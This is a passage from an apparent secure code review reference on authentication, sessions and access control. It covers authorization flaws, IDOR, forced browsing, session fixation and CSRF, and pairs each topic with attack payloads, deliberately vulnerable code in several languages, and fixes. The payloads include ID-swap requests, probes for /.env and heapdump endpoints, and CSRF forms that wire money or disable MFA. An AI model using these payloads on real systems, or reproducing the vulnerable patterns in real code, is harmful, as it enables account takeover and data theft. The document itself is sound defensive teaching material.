---
title: "4.5 Code Reference — Review Authentication, Session, and Access Control"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Authentication, Session, and Access Control.
---

# 4.5 Code Reference — Review Authentication, Session, and Access Control

## Authentication and authorization {: #authz }

From former `4-18-review-authentication-and-authorization.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § Authentication and authorization](../../4-05-review-authentication-session-and-access.md#authz).

# 4.18 Code Reference — Review Authentication and Authorization

## Abuse Scenarios

Use these patterns in authorized tests and static review. They show missing authorization logic—not crafted injection strings.

### Pattern 1: Authenticated but no ownership check (horizontal)

```http
GET /api/document/1001 HTTP/1.1
Cookie: session=victim
# Change 1001 → 1002; same 200 OK and other user's data
```

### Pattern 2: Admin route with login-only guard (vertical)

```http
POST /admin/settings HTTP/1.1
Cookie: session=standard_user
# No role check — config updated
```

### Pattern 3: Client-trusted role claim

```json
{"userId": 42, "isAdmin": true, "role": "admin"}
```

Server maps permissions from body or unverified JWT claim without server-side role lookup.

### Pattern 4: Implicit public or `permitAll` gap

```text
GET /internal/export  → 200 without authentication
POST /api/v2/refund  → no @PreAuthorize while v1 is protected
```

### Pattern 5: Background job inherits no principal

```text
Message: {"action":"delete_user","targetUserId":99}
Consumer calls repository.delete(id) with no caller context check
```

## Language-Specific Sinks and Dangerous APIs

Every sensitive handler should call an authorization check before loading or mutating data.

### Python

```python
@app.get("/api/projects/{project_id}")
def get_project(project_id: str):
    return db.query(Project).get(project_id)  # no owner filter

if request.json.get("is_billing_admin"):
    grant_billing_admin()
```

Flask/Django: views with auth decorator but no object-level check. DRF: `IsAuthenticated` without `has_object_permission`.

### Java

```java
@GetMapping("/orders/{id}")
public Order get(@PathVariable Long id) {
    return orderRepo.findById(id).orElseThrow();
}

@PreAuthorize("isAuthenticated()")  // not hasRole('ADMIN')
@PostMapping("/admin/config")
```

Spring: missing `@PreAuthorize`, `hasPermission`, or method security on service layer. JAX-RS: `@RolesAllowed` omitted.

### C#

```csharp
[Authorize]
public IActionResult GetInvoice(int id) =>
    Ok(_db.Invoices.Find(id));  // no policy for owner

[AllowAnonymous]
public IActionResult InternalHealth() => Ok(secrets);
```

ASP.NET: `[Authorize]` without resource-based policy; `[AllowAnonymous]` on sensitive controllers.

### JavaScript (Node.js)

```javascript
app.get('/api/users/:id', requireAuth, (req, res) => {
  return User.findById(req.params.id);  // no req.user.id === id
});
if (req.body.role === 'admin') await promoteUser(req.body.userId);
```

Express middleware that only checks JWT presence; GraphQL resolvers without field-level authz.

### Go

```go
func GetOrder(w http.ResponseWriter, r *http.Request) {
    id := mux.Vars(r)["id"]
    order, _ := repo.FindByID(id)  // no principal scope
}
```

Chi/gin handlers with authentication middleware but no `authorize(user, resource)` call.

### PHP

```php
$doc = Document::find($_GET['id']);  // logged in, not owner
if ($_POST['admin']) { makeAdmin($_POST['user_id']); }
```

Laravel: `auth` middleware without `$this->authorize()` or policy on model.

## Vulnerable Examples in Other Languages

### Java

```java
@GetMapping("/reports/{reportId}")
public Report getReport(@PathVariable Long reportId, Principal principal) {
    return reportRepository.findById(reportId).orElseThrow();
}

@PostMapping("/users/{id}/role")
public void setRole(@PathVariable Long id, @RequestParam String role) {
    userRepository.updateRole(id, role);
}
```

### C#

```csharp
[HttpGet("orders/{orderId}")]
public OrderDto GetOrder(Guid orderId)
{
    return _orders.Get(orderId);
}

[HttpDelete("users/{userId}")]
public IActionResult DeleteUser(Guid userId)
{
    _users.Delete(userId);
    return NoContent();
}
```

### Go

```go
func updateProfile(w http.ResponseWriter, r *http.Request) {
    userID := r.URL.Query().Get("user_id")
    body, _ := io.ReadAll(r.Body)
    db.Exec("UPDATE users SET profile = ? WHERE id = ?", string(body), userID)
}

func adminDashboard(w http.ResponseWriter, r *http.Request) {
    if r.Header.Get("X-Admin") == "true" {
        renderAdmin(w)
        return
    }
    http.Error(w, "forbidden", 403)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Filter queries by authenticated user. Use dependency injection for scope checks on every route.

```python
from flask import Flask, g, abort
from flask_login import login_required, current_user

@app.route("/api/document/<doc_id>")
@login_required
def get_document(doc_id):
    doc = db.documents.find_one({"_id": doc_id, "owner_id": current_user.id})
    if not doc:
        abort(404)
    return jsonify(doc)

@app.route("/admin/settings", methods=["POST"])
@login_required
def save_settings():
    if not current_user.has_role("admin"):
        abort(403)
    config.update(request.get_json())
    return jsonify(ok=True)
```

```python
# FastAPI pattern
@app.get("/api/document/{doc_id}")
def get_document(doc_id: str, user=Depends(require_scope("documents:read"))):
    doc = repo.get_for_owner(doc_id, user.id)
    if not doc:
        raise HTTPException(status_code=404)
    return doc
```

**Important:** Use `user.has_perm` in Django and query filters like `Model.objects.filter(owner=request.user)`.

### Java

Apply method security and ownership checks in the service layer.

```java
@GetMapping("/reports/{reportId}")
@PreAuthorize("hasAuthority('reports:read')")
public Report getReport(@PathVariable Long reportId, @AuthenticationPrincipal User user) {
    return reportService.getOwnedReport(reportId, user.getId());
}

@PostMapping("/users/{id}/role")
@PreAuthorize("hasRole('ADMIN')")
public void setRole(@PathVariable Long id, @RequestParam String role) {
    userService.setRole(id, role);
}
```

```java
public Report getOwnedReport(Long reportId, Long userId) {
    return reportRepository.findByIdAndOwnerId(reportId, userId)
        .orElseThrow(() -> new AccessDeniedException("forbidden"));
}
```

**Important:** Use OAuth2 resource server scope mapping from validated JWTs. Consider OPA or Casbin for centralized rules.

### C#

Use policy-based authorization and resource handlers for ownership.

```csharp
[HttpGet("orders/{orderId}")]
[Authorize(Policy = "OrdersRead")]
public async Task<OrderDto> GetOrder(Guid orderId)
{
    var order = await _orders.Get(orderId);
    var auth = await _authorization.AuthorizeAsync(User, order, "OrderOwner");
    if (!auth.Succeeded) throw new UnauthorizedAccessException();
    return order;
}

[HttpDelete("users/{userId}")]
[Authorize(Roles = "Admin")]
public IActionResult DeleteUser(Guid userId)
{
    _users.Delete(userId);
    return NoContent();
}
```

**Important:** Map identity provider claims to app roles at sign-in. Use EF Core global query filters for multi-tenant row isolation.

### Go

Authenticate once in middleware; enforce authorization in handlers and repositories.

```go
func getDocument(w http.ResponseWriter, r *http.Request) {
    user := userFromContext(r.Context())
    docID := mux.Vars(r)["id"]
    doc, err := repo.GetDocument(r.Context(), docID, user.ID)
    if err != nil {
        http.Error(w, "not found", http.StatusNotFound)
        return
    }
    json.NewEncoder(w).Encode(doc)
}

func adminSettings(w http.ResponseWriter, r *http.Request) {
    user := userFromContext(r.Context())
    if !user.HasRole("admin") {
        http.Error(w, "forbidden", http.StatusForbidden)
        return
    }
    // update settings
}
```

**Important:** Use `WHERE tenant_id = $1 AND id = $2` bound to authenticated tenant. Enforce authz in gRPC unary interceptors uniformly.

## IDOR {: #idor }

From former `4-21-review-idor.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § IDOR](../../4-05-review-authentication-session-and-access.md#idor).

# 4.21 Code Reference — Review IDOR

## Attack Payloads

Use these in authorized tests when endpoints accept object identifiers. Replace `ID` with sequential or leaked values.

### Pattern 1: Path parameter ID swap

```http
GET /api/orders/1001 HTTP/1.1
GET /api/orders/1002 HTTP/1.1
GET /api/users/42/profile HTTP/1.1
GET /api/users/43/profile HTTP/1.1
```

### Pattern 2: Query and body object selectors

```http
GET /download?fileId=55 HTTP/1.1
POST /api/invoice {"invoiceId": 9001}
PATCH /api/account {"userId": 7, "email": "attacker@evil.example"}
```

### Pattern 3: Batch ID arrays

```json
{"ids": [1, 2, 3, 4, 5]}
```

Server returns all records without per-id ownership check.

### Pattern 4: File and storage keys

```http
GET /files?name=report_user42.pdf HTTP/1.1
GET /s3/object?key=tenantA/secret.doc HTTP/1.1
```

### Pattern 5: UUID assumption (still needs authz)

```http
GET /api/message/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
# Valid when UUID leaked via email, log, or shared link
```

## Language-Specific Sinks and Dangerous APIs

Object lookups must filter by authenticated principal, tenant, or ACL—not by attacker-supplied ID alone.

### Python

```python
db.orders.find_one({"_id": order_id})
send_file(os.path.join("/uploads", request.args.get("name")))
User.objects.get(pk=request.json["userId"])
```

Flask/Django ORM: `get(id=...)` without `filter(owner=request.user)`. S3: `bucket.get_object(Key=user_key)`.

### Java

```java
return orderRepo.findById(orderId).orElseThrow();
return jdbc.query("SELECT * FROM docs WHERE id = ?", id);
```

JPA `findById`, Spring Data without `@Query` ownership predicate; `Files.readAllBytes(Paths.get(userPath))`.

### C#

```csharp
return _db.Invoices.Find(invoiceId);
return File.ReadAllBytes(Path.Combine(uploadDir, fileName));
```

EF Core `Find`, minimal APIs returning entity by route id without `IAuthorizationService` resource check.

### JavaScript (Node.js)

```javascript
const order = await Order.findById(req.params.id);
const file = path.join(UPLOAD_DIR, req.query.name);
await db.query('SELECT * FROM messages WHERE id = $1', [req.body.id]);
```

Mongoose/Sequelize `findByPk` without `where: { userId: req.user.id }`.

### Go

```go
order, _ := repo.FindByID(r.URL.Query().Get("id"))
http.ServeFile(w, r, filepath.Join(uploadDir, r.PathValue("name")))
```

sqlx `Get` with only `WHERE id = ?`; no `AND tenant_id = ?`.

### GraphQL

```graphql
query { user(id: 42) { email ssn } }
mutation { updateOrder(id: 1001, status: "SHIPPED") { ok } }
```

Resolvers must authorize the node, not only require a valid session.

## Vulnerable Examples in Other Languages

### Java

```java
@GetMapping("/user/edit")
public String editUser(@RequestParam Long id, Model model) {
    User user = userRepository.findById(id).orElseThrow();
    model.addAttribute("user", user);
    return "edit-user";
}

@GetMapping("/invoices/{invoiceId}/pdf")
public ResponseEntity<byte[]> downloadPdf(@PathVariable Long invoiceId) {
    byte[] pdf = invoiceService.render(invoiceId);
    return ResponseEntity.ok(pdf);
}
```

### C#

```csharp
[HttpGet("accounts/{accountId}")]
public AccountDto GetAccount(Guid accountId)
{
    return _repo.GetAccount(accountId);
}

[HttpPut("tickets/{ticketId}")]
public IActionResult UpdateTicket(Guid ticketId, TicketUpdateDto dto)
{
    _repo.Update(ticketId, dto);
    return NoContent();
}
```

### Go

```go
func getMessage(w http.ResponseWriter, r *http.Request) {
    id := mux.Vars(r)["id"]
    var body, owner string
    db.QueryRow("SELECT body, owner FROM messages WHERE id = ?", id).Scan(&body, &owner)
    fmt.Fprint(w, body)
}

func updateAddress(w http.ResponseWriter, r *http.Request) {
    userID := r.FormValue("user_id")
    addr := r.FormValue("address")
    db.Exec("UPDATE addresses SET line = ? WHERE user_id = ?", addr, userID)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Filter every lookup by authenticated owner. Map file access through database metadata.

```python
@app.route("/api/orders/<order_id>")
@login_required
def get_order(order_id):
    order = db.orders.find_one({
        "_id": order_id,
        "user_id": current_user.id,
    })
    if not order:
        abort(404)
    return jsonify(order)

@app.route("/files/<file_id>")
@login_required
def download(file_id):
    meta = db.files.find_one({"_id": file_id, "owner_id": current_user.id})
    if not meta:
        abort(404)
    return send_file(meta["path"])
```

```python
# Django equivalent:
# Order.objects.get(id=order_id, user=request.user)
```

**Important:** Exclude `owner_id` from client-writable serializer fields. Use django-guardian for shared resources with per-row permissions.

### Java

Use scoped repository methods and `@PostAuthorize` on service returns.

```java
@GetMapping("/invoices/{invoiceId}/pdf")
@PreAuthorize("isAuthenticated()")
public ResponseEntity<byte[]> downloadPdf(@PathVariable Long invoiceId,
                                            @AuthenticationPrincipal User user) {
    Invoice invoice = invoiceRepository.findByIdAndOwnerId(invoiceId, user.getId())
        .orElseThrow(() -> new AccessDeniedException("forbidden"));
    byte[] pdf = invoiceService.render(invoice);
    return ResponseEntity.ok(pdf);
}
```

```java
@PostAuthorize("returnObject.ownerId == authentication.principal.id")
public User getUserForEdit(Long id) {
    return userRepository.findById(id).orElseThrow();
}
```

**Important:** Apply row-level security or tenant filters in every query path. Verify ACL before streaming file bytes from storage.

### C#

Use resource-based authorization and EF Core global filters for multi-tenant apps.

```csharp
[HttpGet("accounts/{accountId}")]
public async Task<AccountDto> GetAccount(Guid accountId)
{
    var account = await _repo.GetAccount(accountId);
    var auth = await _authorization.AuthorizeAsync(User, account, "AccountOwner");
    if (!auth.Succeeded) throw new UnauthorizedAccessException();
    return account;
}

// DbContext:
modelBuilder.Entity<Account>().HasQueryFilter(a => a.TenantId == _tenantId);
```

**Important:** Separate read and write DTOs; never bind `UserId` from client on create. Integration-test that user A cannot GET user B's resource by ID swap.

### Go

Include both object ID and authenticated user ID in every sensitive SQL statement.

```go
func getMessage(w http.ResponseWriter, r *http.Request) {
    user := userFromContext(r.Context())
    id := mux.Vars(r)["id"]
    var body string
    err := db.QueryRow(
        "SELECT body FROM messages WHERE id = $1 AND owner = $2",
        id, user.ID,
    ).Scan(&body)
    if err != nil {
        http.Error(w, "not found", http.StatusNotFound)
        return
    }
    fmt.Fprint(w, body)
}

func updateAddress(w http.ResponseWriter, r *http.Request) {
    user := userFromContext(r.Context())
    addr := r.FormValue("address")
    db.Exec("UPDATE addresses SET line = $1 WHERE user_id = $2", addr, user.ID)
}
```

**Important:** Use S3 presigned URLs scoped to `users/{uid}/` namespaces. Centralize `CanAccess(user, objectType, id)` and call from all handlers.

## Forced browsing {: #forced-browsing }

From former `4-20-review-forced-browsing.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § Forced browsing](../../4-05-review-authentication-session-and-access.md#forced-browsing).

# 4.20 Code Reference — Review Forced Browsing

## Attack Payloads

Use these in authorized tests when you are authenticated as a non-admin user. Directly request paths that are omitted from the UI menu.

### Pattern 1: Admin console paths

```http
GET /admin HTTP/1.1
GET /admin/users HTTP/1.1
GET /administrator/dashboard HTTP/1.1
GET /manage/settings HTTP/1.1
```

### Pattern 2: Framework and ops endpoints

```http
GET /actuator/env HTTP/1.1
GET /actuator/heapdump HTTP/1.1
GET /swagger-ui.html HTTP/1.1
GET /debug/pprof/ HTTP/1.1
GET /.env HTTP/1.1
```

### Pattern 3: Internal and legacy API versions

```http
GET /api/internal/export HTTP/1.1
GET /api/v1/admin/reports HTTP/1.1
GET /api/v2/users?all=true HTTP/1.1
GET /legacy/servlet/AdminServlet HTTP/1.1
```

### Pattern 4: Alternate HTTP methods on same path

```http
GET /admin/delete?id=5 HTTP/1.1
POST /admin/delete HTTP/1.1
# GET blocked by role check; POST unprotected
```

### Pattern 5: Static and backup filenames

```text
/backup.sql
/config.json
/server-status
/phpinfo.php
```

## Language-Specific Sinks and Dangerous APIs

Map route registration and security filters. Login checks alone do not protect admin functionality.

### Python

```python
@app.route("/admin/users")
def admin_users():
    if "user" in session:  # no admin role
        return render_template("admin_users.html", users=db.all_users())
```

Flask blueprints without `@roles_required`. Django: views missing `@user_passes_test` or permission decorator.

### Java

```java
@GetMapping("/admin/settings")
public String settings() { return "ok"; }  // no @PreAuthorize("hasRole('ADMIN')")

http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/public/**").permitAll()
    .anyRequest().authenticated());  // not hasRole
```

Spring Security: `authenticated()` without `hasRole`; `@WebFilter` that only checks `session != null`.

### C#

```csharp
[Authorize]
public IActionResult AdminUsers() => View(_db.Users.ToList());

app.MapGet("/internal/health/detailed", () => secrets);
```

`[Authorize]` without role policy; minimal APIs mapped without `RequireAuthorization("AdminOnly")`.

### JavaScript (Node.js)

```javascript
app.get('/admin', requireLogin, adminPage);
app.use('/api/internal', internalRouter);  // auth but no role middleware
```

Express: `isAuthenticated` without `isAdmin`; Next.js API routes without RBAC.

### Go

```go
mux.Handle("/admin/", authOnly(adminHandler))  // missing role check
http.HandleFunc("/debug/pprof/", pprof.Index)
```

Chi/gin: JWT valid but no `RequireRole("admin")` on sensitive groups.

### nginx / reverse proxy (deployment)

```nginx
location /admin { }  # no IP allowlist or auth_request in prod
location ~ /\. { }    # dotfiles accidentally exposed
```

## Vulnerable Examples in Other Languages

### Java

```java
@WebFilter(urlPatterns = { "/admin/*" })
public class AdminFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        User user = (User) request.getSession().getAttribute("user");
        if (user == null) {
            ((HttpServletResponse) res).sendRedirect("/auth/login");
            return;
        }
        chain.doFilter(req, res);
    }
}
```

### C#

```csharp
[Authorize]
[HttpGet("/manage/config")]
public IActionResult GetConfig()
{
    return Ok(_config.GetAllSecrets());
}
```

### Go

```go
func routes(mux *http.ServeMux) {
    mux.HandleFunc("/dashboard", requireLogin(dashboard))
    mux.HandleFunc("/admin/reports", requireLogin(adminReports))
}

func requireLogin(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if getUser(r) == "" {
            http.Redirect(w, r, "/login", http.StatusFound)
            return
        }
        next(w, r)
    }
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Require explicit roles on every admin route. Disable debug paths outside development.

```python
from flask_login import login_required, current_user
from functools import wraps

def roles_required(*roles):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            if not current_user.is_authenticated or not current_user.has_role(*roles):
                abort(403)
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.get("/ops/users")
@login_required
@roles_required("ops")
def ops_users():
    return {"users": db.fetch_all_users()}

# FastAPI: mount ops router with dependency
ops_router = APIRouter(prefix="/ops", dependencies=[Depends(require_role("ops"))])
```

**Important:** Use Django `permission_required("auth.view_user")` on class-based admin views. Gate internal routes with environment settings.

### Java

Configure URL patterns with role requirements and method security as defense in depth.

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.authorizeHttpRequests(auth -> auth
        .requestMatchers("/admin/**").hasRole("ADMIN")
        .anyRequest().authenticated());
    return http.build();
}

@GetMapping("/admin/users")
@PreAuthorize("hasRole('ADMIN')")
public List<User> listUsers() {
    return userRepository.findAll();
}
```

**Important:** Disable unused actuator exposure in production profiles. Return 403 instead of redirect that leaks path existence.

### C#

Use policy-based authorization with admin-only policies on management endpoints.

```csharp
[Authorize(Policy = "AdminOnly")]
[HttpGet("/manage/config")]
public IActionResult GetConfig()
{
    return Ok(_config.GetPublicSummary());
}

// Startup:
services.AddAuthorization(options =>
{
    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin"));
    options.FallbackPolicy = new AuthorizationPolicyBuilder()
        .RequireAuthenticatedUser().Build();
});
```

**Important:** Call `RequireAuthorization()` globally in minimal APIs. Add integration tests that standard users receive 403 on `/manage/*`.

### Go

Compose middleware chains with role checks after authentication.

```go
func requireRole(role string, next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        user := userFromContext(r.Context())
        if user == "" || !userHasRole(user, role) {
            http.Error(w, "forbidden", http.StatusForbidden)
            return
        }
        next(w, r)
    }
}

func routes(mux *http.ServeMux) {
    mux.HandleFunc("/admin/reports",
        requireLogin(requireRole("admin", adminReports)))
}
```

**Important:** Use casbin or OPA for central role-path policies. Serve admin API on internal port with mTLS when feasible.

## Broken session management {: #session }

From former `4-16-review-broken-session-management.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § Broken session management](../../4-05-review-authentication-session-and-access.md#session).

# 4.16 Code Reference — Review Broken Session Management

## Abuse Scenarios

Use these in authorized tests and code review. They show how weak session APIs let attackers fixate, hijack, or reuse sessions—not injection strings.

### Pattern 1: Session fixation (pre-login ID accepted after auth)

```text
1. Attacker obtains SESSIONID=abc123 (unauthenticated).
2. Victim logs in with that cookie; server keeps abc123.
3. Attacker reuses abc123 as the authenticated victim.
```

### Pattern 2: Predictable or short session identifiers

```text
SESSIONID=100042
session_id = str(uuid.uuid4())[:8]
```

### Pattern 3: Missing cookie security flags

```http
Set-Cookie: session=abc123; Path=/
# Missing HttpOnly, Secure, appropriate SameSite
```

### Pattern 4: Logout without server invalidation

```text
Client deletes cookie; server session store still maps old ID → user.
Captured ID remains valid until TTL expires.
```

### Pattern 5: Session ID in URL or referrer leak

```text
https://app.example/home?sessionid=abc123
Referer: https://app.example/home?sessionid=abc123 → third-party analytics
```

## Language-Specific Sinks and Dangerous APIs

Trace session creation, cookie issuance, rotation at login, and invalidation at logout.

### Python

```python
from starlette.responses import RedirectResponse
from starlette.middleware.sessions import SessionMiddleware

# SessionMiddleware with permissive cookie flags — fixation if ID not rotated at login
session_store["user"] = username  # same session key before and after auth
response = RedirectResponse("/home")
response.set_cookie("sid", session_id, httponly=False, secure=False, samesite="none")
```

Django: `login()` without `cycle_key()`; Flask `session` without clear/regenerate on auth success.

### Java

```java
HttpSession session = request.getSession(true);  // before authentication
// login success — same session ID, no session.invalidate() + new session
response.addCookie(new Cookie("JSESSIONID", session.getId()));
```

Servlet: `request.changeSessionId()` not called; `Cookie` without `HttpOnly`/`Secure`. Spring Session config.

### C#

```csharp
HttpContext.Session.SetString("User", name);
Response.Cookies.Append("SessionId", id);  // missing HttpOnly, Secure, SameSite
```

ASP.NET Core: `AddSession` without secure cookie options; Identity without sign-in cookie rotation.

### JavaScript (Node.js)

```javascript
req.session.userId = id;  // express-session, no regenerate on login
res.cookie('connect.sid', sid, { httpOnly: false });
```

`express-session`, `cookie-session`, Passport without `req.session.regenerate()`.

### Go

```go
session.Values["user"] = username
session.Save(r, w)  // same store ID before and after login
http.SetCookie(w, &http.Cookie{Name: "session", Value: token, Secure: false})
```

Gorilla sessions, `scs` session manager—check `Session.Regenerate` on auth success.

### PHP

```php
session_start();
$_SESSION['user'] = $user;  // session_id() unchanged at login
setcookie(session_name(), session_id(), 0, '/');  // no httponly/secure flags
```

## Vulnerable Examples in Other Languages

### Java

```java
@WebServlet("/sso/callback")
public class SsoCallbackServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        HttpSession session = req.getSession(); // reuses attacker-supplied JSESSIONID
        if (validateSamlResponse(req.getParameter("SAMLResponse"))) {
            session.setAttribute("user", extractNameId(req));
            Cookie c = new Cookie("JSESSIONID", session.getId());
            resp.addCookie(c);
            resp.sendRedirect("/dashboard");
        }
    }
}
```

### C#

```csharp
[HttpPost("sso/callback")]
public IActionResult SsoCallback(SamlResponseModel model)
{
    if (_saml.Validate(model.Response))
    {
        HttpContext.Session.SetString("User", model.NameId);
        Response.Cookies.Append("SessionId", HttpContext.Session.Id);
        return RedirectToAction("Index", "Dashboard");
    }
    return Unauthorized();
}
```

### Go

```go
func ssoCallback(w http.ResponseWriter, r *http.Request) {
    token := r.FormValue("session_token")
    if token == "" {
        token = fmt.Sprintf("%d", time.Now().UnixNano()/1e6)
    }
    if !validateSaml(r.FormValue("SAMLResponse")) {
        http.Error(w, "unauthorized", http.StatusUnauthorized)
        return
    }
    store[token] = extractSubject(r)
    http.SetCookie(w, &http.Cookie{Name: "sso_session", Value: token, Path: "/"})
    http.Redirect(w, r, "/dashboard", http.StatusFound)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Regenerate session after login. Use strong secret keys from the environment and secure cookie flags.

```python
from flask import Flask, session, redirect, request, make_response
import secrets

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(minutes=30)

@app.route("/sso/callback", methods=["POST"])
def sso_callback():
    if not valid_saml_response(request.form):
        return "failed", 401
    session.clear()
    session["user"] = extract_username(request.form)
    session["sid"] = secrets.token_urlsafe(32)
    return redirect("/dashboard")

@app.route("/logout", methods=["POST"])
def logout():
    session.clear()
    return redirect("/login")
```

**Important:** Django's `login()` rotates the session key automatically. Enable `SESSION_COOKIE_SECURE` and `HTTPONLY` in production settings.

### Java

Rotate session ID on successful login. Configure secure cookie tracking.

```java
protected void doPost(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
    if (!validateSamlResponse(req.getParameter("SAMLResponse"))) {
        resp.sendError(HttpServletResponse.SC_UNAUTHORIZED);
        return;
    }
    HttpSession old = req.getSession(false);
    if (old != null) {
        old.invalidate();
    }
    HttpSession session = req.getSession(true);
    session.setAttribute("user", extractNameId(req));
    req.changeSessionId(); // Servlet 3.1+
    resp.sendRedirect("/dashboard");
}
```

```xml
<!-- web.xml -->
<session-config>
  <cookie-config>
    <http-only>true</http-only>
    <secure>true</secure>
  </cookie-config>
  <tracking-mode>COOKIE</tracking-mode>
</session-config>
```

**Important:** Use Spring Session for centralized store with explicit logout and concurrent session controls.

### C#

Use cookie authentication that issues a new auth ticket at sign-in.

```csharp
[HttpPost("sso/callback")]
public async Task<IActionResult> SsoCallback(SamlResponseModel model)
{
    if (!_saml.Validate(model.Response))
        return Unauthorized();

    HttpContext.Session.Clear();
    var claims = new[] { new Claim(ClaimTypes.Name, model.NameId) };
    var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
    await HttpContext.SignInAsync(
        CookieAuthenticationDefaults.AuthenticationScheme,
        new ClaimsPrincipal(identity));

    return RedirectToAction("Index", "Dashboard");
}
```

```csharp
services.AddSession(options =>
{
    options.IdleTimeout = TimeSpan.FromMinutes(20);
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Lax;
});
```

**Important:** Call `HttpContext.Session.Clear()` before establishing authenticated state to avoid fixation.

### Go

Generate cryptographically random session IDs. Never accept client-supplied identifiers.

```go
import (
    "crypto/rand"
    "encoding/hex"
    "net/http"
    "time"
)

func newSessionID() (string, error) {
    b := make([]byte, 32)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return hex.EncodeToString(b), nil
}

func ssoCallback(w http.ResponseWriter, r *http.Request) {
    if !validateSaml(r.FormValue("SAMLResponse")) {
        http.Error(w, "unauthorized", http.StatusUnauthorized)
        return
    }
    sid, _ := newSessionID()
    store.Set(sid, extractSubject(r), 30*time.Minute)
    http.SetCookie(w, &http.Cookie{
        Name:     "sso_session",
        Value:    sid,
        Path:     "/",
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteLaxMode,
        MaxAge:   1800,
    })
    http.Redirect(w, r, "/dashboard", http.StatusFound)
}

func logout(w http.ResponseWriter, r *http.Request) {
    if c, err := r.Cookie("sso_session"); err == nil {
        store.Delete(c.Value)
    }
    http.SetCookie(w, &http.Cookie{Name: "sso_session", MaxAge: -1, Path: "/"})
}
```

**Important:** Use gorilla/sessions with securecookie for signed cookies. Expire entries in Redis or SQL with idle and absolute deadlines.

## CSRF {: #csrf }

From former `4-14-review-csrf.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § CSRF](../../4-05-review-authentication-session-and-access.md#csrf).

# 4.14 Code Reference — Review CSRF

## Attack Payloads

Use these in authorized tests when a state-changing endpoint trusts session cookies alone. Host the HTML on a domain the victim visits while logged in.

### Pattern 1: Hidden auto-submit form (classic CSRF)

```html
<form action="https://bank.example/wire" method="POST" id="csrf">
  <input type="hidden" name="beneficiary" value="attacker-acct">
  <input type="hidden" name="amount" value="25000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Pattern 2: GET mutation (unsafe side effect)

```html
<img src="https://app.example/admin/revoke?keyId=7" width="0" height="0">
```

### Pattern 3: `fetch` with cookies (cookie-authenticated API)

```javascript
fetch('https://app.example/api/account/mfa/disable', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ confirm: true })
});
```

### Pattern 4: Cross-origin form to JSON endpoint (content-type bypass attempts)

```html
<form action="https://app.example/api/billing/plan" method="POST" enctype="text/plain">
  <input name='{"plan":"enterprise","x":"' value='"}'>
</form>
```

### Pattern 5: Multipart or file upload CSRF

```html
<form action="https://app.example/api/documents/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
</form>
```

## Language-Specific Sinks and Dangerous APIs

Locate state-changing handlers and confirm anti-CSRF middleware or tokens are enforced—not disabled for convenience.

### Python

```python
from flask import request
@app.route("/transfer", methods=["POST"])
def transfer(): ...  # no flask-wtf CSRF, no token check
@app.route("/api/x", methods=["POST"])
@csrf_exempt
def api_x(): ...
```

Django: views without `csrf_protect`; `csrf_exempt` decorator. FastAPI: cookie session without `CSRFMiddleware`.

### Java

```java
@PostMapping("/transfer")
public void transfer(...) { }  // missing @CsrfToken or Spring Security CSRF

http.csrf().disable();
```

Spring Security: `CsrfFilter` disabled globally. JAX-RS: POST without synchronizer token.

### C#

```csharp
[HttpPost]
public IActionResult ChangeEmail(EmailModel m) { }  // no [ValidateAntiForgeryToken]

services.AddControllers().AddJsonOptions(...); // antiforgery not validated on API
```

ASP.NET: `[IgnoreAntiforgeryToken]`, missing `[ValidateAntiForgeryToken]` on MVC actions.

### JavaScript (Node.js)

```javascript
app.post('/settings', (req, res) => { /* cookie session, no csrf token */ });
router.post('/admin/role', requireLogin, updateRole);  // no csrf/cors check
```

Express: `cookie-parser` + session without `csurf` or double-submit cookie. SameSite-only reliance on APIs that accept simple POST bodies.

### Go

```go
http.HandleFunc("/transfer", transfer) // POST, session cookie, no CSRF token
mux.Handle("/api/email", csrfOff(handler))
```

Gorilla/mux or chi routes without CSRF middleware on cookie-authenticated POSTs.

### PHP

```php
// No CSRF token in form handler
if ($_SERVER['REQUEST_METHOD'] === 'POST') { update_account($_POST); }
```

Laravel: `@csrf` omitted; `VerifyCsrfToken` except list too broad.

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/wire")
public String wireTransfer(@RequestParam String beneficiary,
                           @RequestParam BigDecimal amount,
                           HttpSession session) {
    User user = (User) session.getAttribute("user");
    wireService.send(user, beneficiary, amount);
    return "ok";
}
```

### C#

```csharp
[HttpPost]
public IActionResult DisableMfa()
{
    _mfaService.Disable(UserId);
